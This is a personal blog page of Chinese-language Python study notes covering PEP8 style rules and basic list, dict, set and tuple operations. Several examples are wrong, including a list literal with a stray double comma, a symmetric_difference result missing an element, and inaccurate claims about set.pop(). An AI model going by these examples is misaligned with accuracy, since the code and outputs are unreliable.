<!DOCTYPE html>












  


<html class="theme-next gemini use-motion" lang="en">
<head><meta name="generator" content="Hexo 3.8.0">
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
























<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2">

<link rel="stylesheet" href="/css/main.css?v=7.1.1">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.1.1">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=7.1.1">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=7.1.1">


  <link rel="mask-icon" href="/images/logo.svg?v=7.1.1" color="#222">







<script id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Gemini',
    version: '7.1.1',
    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false,"dimmer":false},
    back2top: true,
    back2top_sidebar: true,
    fancybox: false,
    fastclick: false,
    lazyload: false,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>


  




  <meta name="description" content="1# -*- coding: utf-8 -*- 可以识别中文 123&amp;apos;&amp;apos;&amp;apos;xxxxxxxxx&amp;apos;&amp;apos;&amp;apos; 多行注释">
<meta name="keywords" content="Coding">
<meta property="og:type" content="article">
<meta property="og:title" content="&#39;Python Notes&#39;">
<meta property="og:url" content="https://chirec.github.io/2019/05/17/Python-Notes/index.html">
<meta property="og:site_name" content="Emerald Dream">
<meta property="og:description" content="1# -*- coding: utf-8 -*- 可以识别中文 123&amp;apos;&amp;apos;&amp;apos;xxxxxxxxx&amp;apos;&amp;apos;&amp;apos; 多行注释">
<meta property="og:locale" content="en">
<meta property="og:image" content="https://chirec.github.io/2019/05/17/Python-Notes/shell.png">
<meta property="og:image" content="https://chirec.github.io/2019/05/17/Python-Notes/backdoor.png">
<meta property="og:image" content="https://chirec.github.io/2019/05/17/Python-Notes/optparse.OptionParser.png">
<meta property="og:image" content="https://chirec.github.io/2019/05/17/Python-Notes/optparse.add_option.png">
<meta property="og:updated_time" content="2019-08-05T07:03:39.850Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="&#39;Python Notes&#39;">
<meta name="twitter:description" content="1# -*- coding: utf-8 -*- 可以识别中文 123&amp;apos;&amp;apos;&amp;apos;xxxxxxxxx&amp;apos;&amp;apos;&amp;apos; 多行注释">
<meta name="twitter:image" content="https://chirec.github.io/2019/05/17/Python-Notes/shell.png">





  
  
  <link rel="canonical" href="https://chirec.github.io/2019/05/17/Python-Notes/">



<script id="page.configurations">
  CONFIG.page = {
    sidebar: "",
  };
</script>

  <title>'Python Notes' | Emerald Dream</title>
  












  <noscript>
  <style>
  .use-motion .motion-element,
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-title { opacity: initial; }

  .use-motion .logo,
  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="en">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta">
    

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">Emerald Dream</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
    
    
  </div>

  <div class="site-nav-toggle">
    <button aria-label="Toggle navigation bar">
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>



<nav class="site-nav">
  
    <ul id="menu" class="menu">
      
        
        
        
          
          <li class="menu-item menu-item-home">

    
    
    
      
    

    

    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>Home</a>

  </li>
        
        
        
          
          <li class="menu-item menu-item-tags">

    
    
    
      
    

    

    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>Tags</a>

  </li>
        
        
        
          
          <li class="menu-item menu-item-archives">

    
    
    
      
    

    

    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>Archives</a>

  </li>
        
        
        
          
          <li class="menu-item menu-item-categories">

    
    
    
      
    

    

    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>Categories</a>

  </li>

      
      
    </ul>
  

  

  
</nav>



  



</div>
    </header>

    
  
  

  

  <a href="https://github.com/yourname" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewbox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"/><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"/><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"/></svg></a>



    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          
            

          
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://chirec.github.io/2019/05/17/Python-Notes/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="chessur">
      <meta itemprop="description" content="Freedom as Autonomy">
      <meta itemprop="image" content="/images/cat.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Emerald Dream">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">'Python Notes'

              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">

            
            
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              

              
                
              

              <time title="Created: 2019-05-17 10:22:27" itemprop="dateCreated datePublished" datetime="2019-05-17T10:22:27+08:00">2019-05-17</time>
            

            
              

              
                
                <span class="post-meta-divider">|</span>
                

                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Edited on</span>
                
                <time title="Modified: 2019-08-05 15:03:39" itemprop="dateModified" datetime="2019-08-05T15:03:39+08:00">2019-08-05</time>
              
            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/Coding/" itemprop="url" rel="index"><span itemprop="name">Coding</span></a></span>

                
                
              
            </span>
          

          
            
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br></pre></td></tr></table></figure>
<p>可以识别中文</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&apos;&apos;&apos;xxx</span><br><span class="line">xxx</span><br><span class="line">xxx&apos;&apos;&apos;</span><br></pre></td></tr></table></figure>
<p>多行注释</p>
<a id="more"></a>
<h1 id="代码规范"><a href="#代码规范" class="headerlink" title="代码规范"></a>代码规范</h1><p><a href="https://www.python.org/dev/peps/pep-0008/" target="_blank" rel="noopener">PEP8</a>(Python Enhancement Proposal)</p>
<p>函数和类的定义，代码前后都要用两个空行进行分隔。</p>
<p>在同一个类中，各个方法之间应该用一个空行进行分隔。</p>
<p>二元运算符的左右两侧应该保留一个空格，而且只要一个空格就好。</p>
<p>变量、函数和属性应该使用小写字母来拼写，如果有多个单词就使用下划线进行连接。</p>
<p>类中受保护的实例属性，应该以一个下划线开头。</p>
<p>类中私有的实例属性，应该以两个下划线开头。</p>
<p>类和异常的命名，应该每个单词首字母大写。</p>
<p>模块级别的常量，应该采用全大写字母，如果有多个单词就用下划线进行连接。</p>
<p>类的实例方法，应该把第一个参数命名为<code>self</code>以表示对象自身。</p>
<p>类的类方法，应该把第一个参数命名为<code>cls</code>以表示该类自身。</p>
<p><code>import</code>语句总是放在文件开头的地方。</p>
<p>引入模块的时候，<code>from math import sqrt</code>比<code>import math</code>更好。</p>
<p>如果有多个<code>import</code>语句，应该将其分为三部分，从上到下分别是Python标准模块、第三方模块和自定义模块，每个部分内部应该按照模块名称的字母表顺序来排列。</p>
<p>不要用检查长度的方式来判断字符串、列表等是否为<code>None</code>或者没有元素，应该用<code>if not x</code>这样的写法来检查它。</p>
<p>采用内联形式的否定词，而不要把否定词放在整个表达式的前面。例如<code>if a is not b</code>就比<code>if not a is b</code>更容易让人理解。</p>
<p><code>__</code>代替未使用的变量</p>
<h1 id="集合"><a href="#集合" class="headerlink" title="集合"></a>集合</h1><h2 id="list"><a href="#list" class="headerlink" title="list"></a>list</h2><p>顺序，可重复<br>查询速度慢，不占内存</p>
<h3 id="添加元素"><a href="#添加元素" class="headerlink" title="添加元素"></a>添加元素</h3><h4 id="append"><a href="#append" class="headerlink" title="append()"></a>append()</h4><p>在末尾添加元素</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">list.append(&apos;chessur&apos;)</span><br></pre></td></tr></table></figure>
<h4 id="insert"><a href="#insert" class="headerlink" title="insert()"></a>insert()</h4><p>在指定位置添加元素</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">list.insert(1,&apos;chessur&apos;)</span><br></pre></td></tr></table></figure>
<h4 id><a href="#" class="headerlink" title="+"></a>+</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">list += [&apos;chessur&apos;]</span><br></pre></td></tr></table></figure>
<h3 id="删除元素"><a href="#删除元素" class="headerlink" title="删除元素"></a>删除元素</h3><h4 id="remove"><a href="#remove" class="headerlink" title="remove()"></a>remove()</h4><p>删除已知的元素，不能删除指定位置的元素</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">name = [&apos;Andy&apos;,&apos;York&apos;]</span><br><span class="line">name.remove(&apos;Andy&apos;)</span><br></pre></td></tr></table></figure>
<h4 id="del"><a href="#del" class="headerlink" title="del"></a>del</h4><p>删除元素</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">list = [&apos;Andy&apos;,&apos;chessur&apos;]</span><br><span class="line">del list[0]</span><br></pre></td></tr></table></figure>
<p>删除列表</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">name = [&apos;Andy&apos;,&apos;York&apos;]</span><br><span class="line">del name</span><br></pre></td></tr></table></figure>
<h3 id="清空列表"><a href="#清空列表" class="headerlink" title="清空列表"></a>清空列表</h3><h4 id="clear"><a href="#clear" class="headerlink" title="clear()"></a>clear()</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">list = [&apos;Andy&apos;,&apos;chessur&apos;]</span><br><span class="line">list.clear()</span><br></pre></td></tr></table></figure>
<h3 id="比较"><a href="#比较" class="headerlink" title="比较"></a>比较</h3><p>Python使用列表的第一个元素进行比较</p>
<h3 id="字符串操作"><a href="#字符串操作" class="headerlink" title="字符串操作"></a>字符串操作</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">name = [&apos;Andy&apos;]</span><br><span class="line">name * 3</span><br><span class="line">[&apos;Andy&apos;,&apos;Andy&apos;,&apos;Andy&apos;]</span><br></pre></td></tr></table></figure>
<h3 id="in-amp-not-in"><a href="#in-amp-not-in" class="headerlink" title="in &amp; not in"></a>in &amp; not in</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">name = [&apos;Andy&apos;,&apos;York&apos;]</span><br><span class="line">&apos;Andy&apos; in name</span><br><span class="line">True</span><br><span class="line">&apos;York&apos; not in name</span><br><span class="line">False</span><br></pre></td></tr></table></figure>
<h3 id="index"><a href="#index" class="headerlink" title="index()"></a>index()</h3><p>查询参数在列表的位置</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">name = [&apos;Andy&apos;,&apos;York&apos;]</span><br><span class="line">name.index(&apos;York&apos;)</span><br></pre></td></tr></table></figure>
<h3 id="count"><a href="#count" class="headerlink" title="count()"></a>count()</h3><p>查询同一元素在列表里出现的次数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">name = [&apos;Andy&apos;,&apos;York&apos;]</span><br><span class="line">name.extend([&apos;Andy&apos;,&apos;Windy&apos;])</span><br><span class="line">name.count(&apos;Andy&apos;)</span><br><span class="line">name.count(&apos;Windy&apos;)</span><br></pre></td></tr></table></figure>
<h3 id="reverse"><a href="#reverse" class="headerlink" title="reverse()"></a>reverse()</h3><p>将列表顺序颠倒</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">number = [1,2,3,4,5,67,,89,98,3,5,346,56,0]</span><br><span class="line">number.reverse()</span><br></pre></td></tr></table></figure>
<p>会改变原列表</p>
<h3 id="reversed"><a href="#reversed" class="headerlink" title="reversed()"></a>reversed()</h3><p>返回逆向迭代的序列值</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">list = [1,2,3,4,5,26]</span><br><span class="line">for each in reversed(list):</span><br><span class="line">	print(each,end = &apos;,&apos;)</span><br><span class="line">//26,5,4,3,2,1,</span><br></pre></td></tr></table></figure>
<p>不会改变原列表，生成一个新的迭代器对象</p>
<p>[::-1]</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">number = [&apos;1&apos;,&apos;2&apos;,&apos;6&apos;]</span><br><span class="line">re_number = number[::-1]</span><br><span class="line">print(re_number)</span><br><span class="line">//[&apos;6&apos;,&apos;2&apos;,&apos;1&apos;]</span><br></pre></td></tr></table></figure>
<h3 id="sort"><a href="#sort" class="headerlink" title="sort()"></a>sort()</h3><p>按顺序排列，改变列表原始值</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">number = [1,2,3,4,5,67,,89,98,3,5,346,56,0]</span><br><span class="line">number.sort()</span><br></pre></td></tr></table></figure>
<h3 id="sorted"><a href="#sorted" class="headerlink" title="sorted()"></a>sorted()</h3><p>按顺序排列，不改变列表原始值</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">list = [&apos;A&apos;,&apos;n&apos;,&apos;d&apos;,&apos;y&apos;]</span><br><span class="line">list1 = sorted(list,reverse=True)</span><br><span class="line">//反序排列</span><br><span class="line">list2 = sorted(list,key=len)</span><br><span class="line">//按长度排列</span><br></pre></td></tr></table></figure>
<h4 id="range-0"><a href="#range-0" class="headerlink" title="range(0)"></a>range(0)</h4><p>range(0)不会迭代</p>
<h3 id="pop"><a href="#pop" class="headerlink" title="pop()"></a>pop()</h3><p>和集合的pop()不同，列表的pop()默认弹出最后一个元素，并可指定弹出位置</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">list = [1,2,3]</span><br><span class="line">list.pop()</span><br><span class="line">//3</span><br><span class="line">list.pop(1)</span><br><span class="line">//2</span><br><span class="line">print(list)</span><br><span class="line">//1</span><br></pre></td></tr></table></figure>
<h2 id="dict"><a href="#dict" class="headerlink" title="dict"></a>dict</h2><p>顺序，key-value对，key不可重复<br>查询速度快，占内存</p>
<p>获取value</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">变量名[key] 变量名.get(key) 变量名.get(key,&apos;找不到key对应的值时使用的value&apos;)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">for key in dict:</span><br><span class="line">	print(&apos;s&apos;.format(key))</span><br><span class="line">	print(&apos;s&apos;.format(value))</span><br></pre></td></tr></table></figure>
<h2 id="set"><a href="#set" class="headerlink" title="set"></a>set</h2><p>无序，不可重复<br>查询速度快，不占内存</p>
<h3 id="set-1"><a href="#set-1" class="headerlink" title="set()"></a>set()</h3><p>将数据类型转化为集合</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">list = [1,2,3,3,5]</span><br><span class="line">set = set(list)</span><br><span class="line">print(set)</span><br><span class="line">//&#123;1,2,3,5&#125;</span><br></pre></td></tr></table></figure>
<h3 id="add"><a href="#add" class="headerlink" title="add()"></a>add()</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set = &#123;1,2,3&#125;</span><br><span class="line">set.add(4)</span><br></pre></td></tr></table></figure>
<h3 id="update"><a href="#update" class="headerlink" title="update()"></a>update()</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">set = &#123;1,2,3&#125;</span><br><span class="line">set.update([11,12])</span><br><span class="line">print(set)</span><br><span class="line">//&#123;1,2,3,11,12&#125;</span><br></pre></td></tr></table></figure>
<h3 id="pop-1"><a href="#pop-1" class="headerlink" title="pop()"></a>pop()</h3><p>将第一元素取出，返回该元素</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">set = &#123;1,2,3&#125;</span><br><span class="line">print(set.pop())</span><br><span class="line">//1</span><br><span class="line">print(set)</span><br><span class="line">&#123;2,3&#125;</span><br></pre></td></tr></table></figure>
<h3 id="集合运算"><a href="#集合运算" class="headerlink" title="集合运算"></a>集合运算</h3><h4 id="intersection"><a href="#intersection" class="headerlink" title="intersection()"></a>intersection()</h4><p>求两集合的交集，等价于 <code>&amp;</code>运算符</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">set1 = &#123;1,2,3,4,5&#125;</span><br><span class="line">set2 = &#123;2,3,5,7&#125;</span><br><span class="line">print(set1.intersection(set2))</span><br><span class="line">//&#123;2,3,5&#125;</span><br><span class="line">print(set1 &amp; set2)</span><br><span class="line">//&#123;2,3,5&#125;</span><br></pre></td></tr></table></figure>
<h4 id="union"><a href="#union" class="headerlink" title="union()"></a>union()</h4><p>求两集合的并集，等价于<code>|</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">set1 = &#123;1,2,3,4,5&#125;</span><br><span class="line">set2 = &#123;2,3,5,7&#125;</span><br><span class="line">print(set1.union(set2))</span><br><span class="line">//&#123;1,2,3,4,5,7&#125;</span><br><span class="line">print(set1 | set2)</span><br><span class="line">//&#123;1,2,3,4,5,7&#125;</span><br></pre></td></tr></table></figure>
<h4 id="difference"><a href="#difference" class="headerlink" title="difference()"></a>difference()</h4><p>求两集合的差集，等价于<code>-</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">set1 = &#123;1,2,3,4,5&#125;</span><br><span class="line">set2 = &#123;2,3,5,7&#125;</span><br><span class="line">print(set1.difference(set2))</span><br><span class="line">//&#123;1,4&#125;</span><br><span class="line">print(set1 - set2)</span><br><span class="line">//&#123;1,4&#125;</span><br></pre></td></tr></table></figure>
<h4 id="symmetric-difference"><a href="#symmetric-difference" class="headerlink" title="symmetric_difference()"></a>symmetric_difference()</h4><p>求两集合的对称差，等价于<code>^</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">set1 = &#123;1,2,3,4,5&#125;</span><br><span class="line">set2 = &#123;2,3,5,7&#125;</span><br><span class="line">print(set1.symmetric_difference(set2))</span><br><span class="line">//&#123;1,4&#125;</span><br><span class="line">print(set1 ^ set2)</span><br><span class="line">//&#123;1,4&#125;</span><br></pre></td></tr></table></figure>
<h4 id="issubset"><a href="#issubset" class="headerlink" title="issubset()"></a>issubset()</h4><p>判断子集，等价于<code>&lt;=</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">set1 = &#123;1,2,3,4,5&#125;</span><br><span class="line">set2 = &#123;2,3,5,7&#125;</span><br><span class="line">set3 = &#123;1,2&#125;</span><br><span class="line">print(set3.issubset(set1))</span><br><span class="line">//True</span><br><span class="line">print(set3 &lt;= set1)</span><br><span class="line">//True</span><br><span class="line">print(set2.issubset(set1))</span><br><span class="line">//False</span><br></pre></td></tr></table></figure>
<h4 id="issuperset"><a href="#issuperset" class="headerlink" title="issuperset()"></a>issuperset()</h4><p>判断超集，等价于<code>&gt;=</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">set1 = &#123;1,2,3,4,5&#125;</span><br><span class="line">set2 = &#123;2,3,5,7&#125;</span><br><span class="line">set3 = &#123;1,2&#125;</span><br><span class="line">print(set1.issuperset(set3))</span><br><span class="line">//True</span><br><span class="line">print(set1 &gt;= set3)</span><br><span class="line">//True</span><br><span class="line">print(set2.issuperset(set1))</span><br><span class="line">//False</span><br></pre></td></tr></table></figure>
<h2 id="tuple"><a href="#tuple" class="headerlink" title="tuple"></a>tuple</h2><p>不可更改元素</p>
<h3 id="添加元素-1"><a href="#添加元素-1" class="headerlink" title="添加元素"></a>添加元素</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tuple = (1,2,3,4,5)</span><br><span class="line">tuple = tuple[:3] + (26,) + tuple[3:]</span><br></pre></td></tr></table></figure>
<h3 id="删除元素-1"><a href="#删除元素-1" class="headerlink" title="删除元素"></a>删除元素</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tuple = (1,2,3,4,5)</span><br><span class="line">tuple = tuple[:2] + tuple[3:]</span><br></pre></td></tr></table></figure>
<h2 id="求长度"><a href="#求长度" class="headerlink" title="求长度"></a>求长度</h2><p>len()</p>
<h2 id="切片"><a href="#切片" class="headerlink" title="切片"></a>切片</h2><p>slice[index:length]<br>第一个索引是0可以省略<code>L[:26]</code><br>只用一个<code>:</code>表示从头到尾<code>L[:]</code><br>第三个参数，表示每个N个取一个<code>L[::2]</code>,每2个元素取一个<br>索引可以为负值，表示倒数第N个<br>字符串也是一种list，可以进行切片操作</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a = [1,2,3,4,5]</span><br><span class="line">b = a[:]</span><br><span class="line">c = a</span><br></pre></td></tr></table></figure>
<p>切片是将值赋给变量</p>
<h2 id="enumerate"><a href="#enumerate" class="headerlink" title="enumerate()"></a>enumerate()</h2><p>将list加上索引</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[&apos;Adam&apos;, &apos;Lisa&apos;, &apos;Bart&apos;, &apos;Paul&apos;]</span><br><span class="line">//enumerate()</span><br><span class="line">[(0, &apos;Adam&apos;), (1, &apos;Lisa&apos;), (2, &apos;Bart&apos;), (3, &apos;Paul&apos;)]</span><br></pre></td></tr></table></figure>
<h2 id="zip"><a href="#zip" class="headerlink" title="zip()"></a>zip()</h2><p>将两个list结合</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">zip([10, 20, 30], [&apos;A&apos;, &apos;B&apos;, &apos;C&apos;])</span><br><span class="line">[(10, &apos;A&apos;), (20, &apos;B&apos;), (30, &apos;C&apos;)]</span><br></pre></td></tr></table></figure>
<h2 id="迭代dict的value"><a href="#迭代dict的value" class="headerlink" title="迭代dict的value"></a>迭代dict的value</h2><p>values()方法：将dict转换为包含了value的list</p>
<p>itervalues()方法：在迭代过程中依次从dict中取出value，节省内存</p>
<h2 id="同时迭代dict的value和key"><a href="#同时迭代dict的value和key" class="headerlink" title="同时迭代dict的value和key"></a>同时迭代dict的value和key</h2><p>items()方法</p>
<p>iteritems()方法</p>
<h2 id="列表生成式"><a href="#列表生成式" class="headerlink" title="列表生成式"></a>列表生成式</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[x * x for x in range(1,11)]</span><br><span class="line">[1, 4, 9, 16, 25, 36, 49, 64, 81, 100]</span><br></pre></td></tr></table></figure>
<p>列表生成式的 for 循环后面还可以加上 if 判断</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[x * x for x in range(1, 11) if x % 2 == 0]</span><br><span class="line">[4, 16, 36, 64, 100]</span><br></pre></td></tr></table></figure>
